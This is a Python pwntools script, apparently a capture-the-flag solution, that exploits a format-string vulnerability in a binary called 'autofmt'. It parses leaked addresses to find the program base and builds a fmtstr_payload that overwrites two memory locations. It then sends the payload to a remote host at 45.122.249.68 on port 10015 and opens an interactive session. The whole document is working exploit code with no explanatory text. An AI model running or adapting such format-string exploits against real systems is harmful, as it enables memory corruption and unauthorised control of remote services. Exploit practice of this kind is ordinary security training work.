from pwn import *
context.clear(arch = 'amd64')

BIN = "./autofmt"
elf = ELF(BIN)
offset_a = 0x3038
offset_b = 0x3030

def send_payload(payload):
	io = process([elf.path])
	io.sendline(payload)
	return io.recvall()

def exploit():
	__breakpoint="""
		b*main+208 
	""" #b*main+276
	l = io.recvuntil("a address:").decode().split("\n")
	pad_a = int(l[1][4:])
	pad_b = int(l[2][4:])
	# print("Pading a = " + pad_a)
	# print("Pading b = " + pad_b)
	addr_a = int(io.recv(1024).decode(),16)
	base = addr_a - offset_a
	addr_b = base + offset_b
	print("Base: " + hex(base))
	print("Addr a = " + hex(addr_a))
	print("Addr b = " + hex(addr_b))
	offset = FmtStr(execute_fmt=send_payload).offset
	payload = fmtstr_payload(offset, {addr_a: pad_a, addr_b: pad_b}, write_size='short')

	print(payload)
	# print(payload_b)
	# payload = p64(addr_a) + bytes(payload_a,'utf-8')
	# print(payload)
	io.sendline(payload)
	io.interactive()

#io = process(BIN)
io = remote('45.122.249.68', 10015)
context.log_level = "debug"
exploit()